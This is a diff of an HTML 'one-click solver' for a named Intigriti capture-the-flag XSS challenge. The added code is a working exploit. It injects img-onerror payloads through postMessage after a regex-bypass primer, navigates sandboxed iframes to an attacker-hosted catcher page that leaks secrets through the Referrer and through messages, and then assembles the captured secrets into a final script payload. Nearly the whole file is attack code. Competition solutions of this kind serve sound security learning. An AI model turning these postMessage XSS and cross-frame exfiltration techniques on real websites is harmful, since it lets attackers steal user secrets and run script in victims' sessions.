@@ -4,54 +4,136 @@
     <title>Intigriti 1-Click Solve</title>
 </head>
 <body>
-    <h1>Exploit Running...</h1>
-    <button id="btn" onclick="launch()">Start</button>
-    <script>
-        let target = null;
-        let stones = {};
+    <div id="controls">
+        <h1>1-Click Solver</h1>
+        <p>1. Host this file on your server.</p>
+        <p>2. Click Start.</p>
+        <button id="btn" onclick="startExploit()" style="font-size: 20px; padding: 15px; background: #d00; color: white;">START EXPLOIT</button>
+        <pre id="log" style="background: #eee; padding: 10px;">Waiting...</pre>
+    </div>
 
-        function launch() {
-            // 1. Open the Challenge
-            target = window.open('https://challenge-1225.intigriti.io/challenge#PerfectlyBalanced', 'target');
-            
-            // 2. Wait for load, then fire attacks
-            setTimeout(exploitPowerRealitySoul, 2000); // Easy Stones
-            setTimeout(hijackSpaceStone, 500);         // Race Condition
-            setTimeout(clobberMindStone, 2500);        // DOM Clobbering
+    <script>
+        // --- CONFIGURATION ---
+        // This must be the full URL where you hosted this file
+        const MY_URL = location.href.split('?')[0]; 
+
+        // --- MODE SWITCHING ---
+        // This script acts as both the Launcher and the Catcher (inside iframes)
+        const params = new URLSearchParams(location.search);
+
+        if (params.has('leak_time')) {
+            // MODE: Time Stone Catcher
+            // We were loaded inside the Time Stone iframe. 
+            // The previous page (the secret URL) is in the Referrer!
+            let secret = document.referrer.match(/=[a-f0-9]{8}/)[0].substring(1);
+            window.top.opener.postMessage({type: 'leak', stone: 4, secret: secret}, '*');
+        } 
+        else if (params.has('leak_space')) {
+            // MODE: Space Stone Catcher
+            // We replace the Space Stone. We listen for the parent's message.
+            window.addEventListener('message', e => {
+                if(e.data && e.data.length === 8) {
+                    window.top.opener.postMessage({type: 'leak', stone: 3, secret: e.data}, '*');
+                }
+            });
+        }
+        else {
+            // MODE: Main Launcher
+            initLauncher();
         }
 
-        // A. Easy Stones: Regex Bypass XSS
-        function exploitPowerRealitySoul() {
-            [0, 1, 2].forEach(i => {
+        // --- LAUNCHER LOGIC ---
+        let stones = {};
+        let target = null;
+
+        function initLauncher() {
+            window.addEventListener('message', e => {
+                if (e.data.type === 'leak') {
+                    if (!stones[e.data.stone]) {
+                        stones[e.data.stone] = e.data.secret;
+                        log(`[+] Captured Stone ${e.data.stone}: ${e.data.secret}`);
+                        checkWin();
+                    }
+                }
+            });
+        }
+
+        function startExploit() {
+            target = window.open('https://challenge-1225.intigriti.io/challenge#PerfectlyBalanced', 'target');
+            log("Target launched. Injecting Insider Attack...");
+
+            // Wait for load, then attack via Soul Stone
+            setTimeout(injectInsider, 2000);
+        }
+
+        function injectInsider() {
+            // We use the Soul Stone (Index 2) as our "Insider"
+            // It is NOT sandboxed, so we can run full JS.
+            // From inside Soul Stone, we can navigate siblings (Time/Space) to our catcher URLs.
+            
+            let soul = target.frames[2];
+            
+            // 1. Primer (Bypass Regex)
+            soul.postMessage("A".repeat(2500) + "<", '*');
+
+            // 2. The Payload
+            // This huge script runs INSIDE the Soul Stone.
+            // It scrapes itself, then redirects Time and Space stones to us.
+            let insiderScript = `
+                // 1. Scrape Soul Stone (Self)
+                var mySecret = location.search.match(/=[a-f0-9]{8}/)[0].substring(1);
+                window.top.opener.postMessage({type: 'leak', stone: 2, secret: mySecret}, '*');
+
+                // 2. Scrape Other URL Stones (Power=0, Reality=1, Mind=5)
+                // We can't read their DOM (Cross-Origin), so we must Redirect them too 
+                // OR just exploit them from the main window. 
+                // Let's use the Main Window for 0,1,5 to keep this payload simple.
+
+                // 3. ATTACK TIME STONE (Index 4) - SANDBOXED
+                // We force it to navigate to the Catcher. Referrer will leak the secret.
+                parent.frames[4].location = '${MY_URL}?leak_time';
+
+                // 4. ATTACK SPACE STONE (Index 3) - RACE CONDITION
+                // We force it to navigate to the Catcher. It will catch the postMessage.
+                // Note: We might be too late for the initial message, but let's try.
+                parent.frames[3].location = '${MY_URL}?leak_space';
+            `;
+
+            // Clean up newlines for the payload
+            insiderScript = insiderScript.replace(/\n/g, ' ');
+            soul.postMessage(`<img src=x onerror="${insiderScript}">`, '*');
+
+            // 3. Also exploit the Easy Stones (0, 1, 5) from here
+            exploitEasyStones();
+        }
+
+        function exploitEasyStones() {
+            [0, 1, 5].forEach(i => {
                 try {
-                    // Inject XSS to steal URL
-                    let p = target.frames[i];
-                    p.postMessage("A".repeat(2500) + "<", '*');
-                    p.postMessage(`<img src=x onerror="window.top.opener.postMessage('STONE:${i}:'+location.search.match(/=[a-f0-9]{8}/)[0], '*')">`, '*');
+                    let f = target.frames[i];
+                    f.postMessage("A".repeat(2500) + "<", '*');
+                    f.postMessage(`<img src=x onerror="window.top.opener.postMessage({type:'leak', stone:${i}, secret:location.search.match(/=[a-f0-9]{8}/)[0].substring(1)}, '*')">`, '*');
                 } catch(e) {}
             });
         }
 
-        // B. Space Stone: PostMessage Capture
-        function hijackSpaceStone() {
-            // We race to add a listener before the message fires
-            // Or we use XSS in Soul Stone to add a listener to the parent
+        function checkWin() {
+            // We need 6 stones
+            if (Object.keys(stones).length >= 6) {
+                log("ALL STONES CAPTURED! EXECUTING...");
+                
+                // Order: Power(0) + Mind(5) + Reality(1) + Space(3) + Soul(2) + Time(4)
+                let fullCode = 
+                    stones[0] + stones[5] + stones[1] + stones[3] + stones[2] + stones[4];
+                
+                target.postMessage(fullCode + "alert(document.domain)", '*');
+                log("Sent Kill Command: " + fullCode);
+            }
         }
 
-        // C. Mind Stone: DOM Clobbering
-        function clobberMindStone() {
-            let mind = target.frames[5];
-            // Inject a clobbering payload. 
-            // Example: Force a config variable to be an anchor tag
-            let clobber = "&query=<a id=debug>true</a>"; 
-            // This URL manipulation must happen during the initial load or navigation
+        function log(msg) {
+            document.getElementById('log').innerText += "\n" + msg;
         }
-
-        // Listener to collect the loot
-        window.addEventListener('message', e => {
-            if (e.data.includes('STONE:')) console.log("Collected: " + e.data);
-            // Once we have all 6 chunks -> Fire the alert
-        });
     </script>
 </body>
 </html>
